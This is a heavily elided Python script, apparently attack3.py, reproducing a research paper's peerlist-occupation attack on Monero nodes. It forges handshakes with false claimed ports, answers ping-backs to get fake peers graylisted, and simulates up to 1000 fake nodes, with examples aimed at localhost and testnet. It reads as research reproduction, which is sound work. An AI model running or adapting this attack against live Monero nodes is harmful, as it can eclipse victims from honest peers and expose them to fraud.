...
def send_handshake(source_ip: Optional[str], target_ip: str, target_port: int,
    ...
    try:
        ...
        payload = build_handshake_payload(
            ...
            peer_id=peer_id,
            my_port=target_port,  # Claim we're listening on same port
            current_height=1,
...
def build_network_address(ip: str, port: int) -> PortableStorageWriter:
    ...
    # Monero's m_ip stores the result of inet_addr() which is network-byte-order bytes
    # in a uint32_t. On a LE system, m_ip = 0x01002c2c for IP 44.44.0.1.
    # KV serialization uses SWAP32LE (no-op on LE) so the stored value = m_ip.
    # add_uint32 packs as '<I', so to get the right bytes in storage we need
    # the same integer value as inet_addr() returns on LE: unpack raw bytes as '<I'.
...
# Ping-Back Responder
# =============================================================================
# Global registry: claimed_port -> peer_id (so ping responder knows which peer_id to reply with)
_ping_peer_ids = {}
...
_graylist_ports = set()
_timed_sync_peer_entries = {}  # dict: port -> list of peerlist entries
...
def perform_simulated_handshake(config: AttackConfig, network_id: bytes,
    ...
    try:
        ...
        #    The victim connects to our claimed_port asynchronously,
        #    so we need to give it time before disconnecting
        time.sleep(2)
        return True
    except socket.error as e:
...
def simulated_peerlist_occupation_attack(config: AttackConfig):
    ...
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as exc:
        for idx, (node_id, claimed_port, peer_id) in enumerate(graylist_nodes):
            ...
            wait_seconds = max(90.0, float(config.keep_alive_interval))
            fut = exc.submit(
...
Examples:
  # Single handshake test to local node
  python attack3.py --target 127.0.0.1 --port 18080
  # Simulated attack with 1000 fake nodes (paper's experiment setting)
  python attack3.py --target 127.0.0.1 --port 18080 --simulate --nodes 1000
  # Use testnet
  python attack3.py --target 127.0.0.1 --port 28080 --network testnet --simulate --nodes 100
        """
    )
